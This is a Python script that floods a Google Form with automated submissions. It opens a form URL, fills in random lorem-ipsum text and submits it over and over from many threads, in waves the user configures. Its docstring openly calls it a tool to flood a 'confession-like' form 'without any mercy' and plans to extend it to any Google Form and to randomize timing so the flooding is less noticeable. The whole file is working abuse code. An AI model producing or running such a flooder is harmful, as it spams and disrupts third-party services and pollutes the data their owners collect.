"""
Author : nmatton
last update [%Y%m%d] : 151209
Tool : flood unconsciously and without any mercy a "confession-like" google form
Required module : mechanize (https://pypi.python.org/pypi/mechanize/) ; loremipsum (https://pypi.python.org/pypi/loremipsum/)
Usage : python ./flood_test_v2.py [url to google form]

For next upgrade :
* generalize to flood any kind of google form
* randomize idle between send

"""


import mechanize, sys
from threading import *
from time import sleep
import loremipsum

link = sys.argv[1]

def vota():
    """
    function of sending form. Lorem ipsum sent is random. Default parameters fit to common cases.
    """
    br = mechanize.Browser()
    br.open(link)
    br.select_form(nr=0)
    nome = br.form.controls[0].name
    a,b,br[nome] = loremipsum.generate_paragraph()
    #br[nome]='test'
    br.submit()
    br.close()

def main():
    qtd = int(raw_input('How many answer to send ?: '))
    qps = int(raw_input('How many per wave ?: '))
    wtt = int(raw_input('Idle time between wave ?: '))
    c = 0
    j=0
    for i in range(qtd):
        t = Thread(target=vota, args=[])
        t.start()

        c += 1
        j=j+1
        sys.stdout.flush()
        sys.stdout.write('\r%05d votos...' %(c))
        if j==qps:
            sleep(wtt)
            j=0

        while(activeCount() > 30):
            sleep(0.001)

    print ""

main()
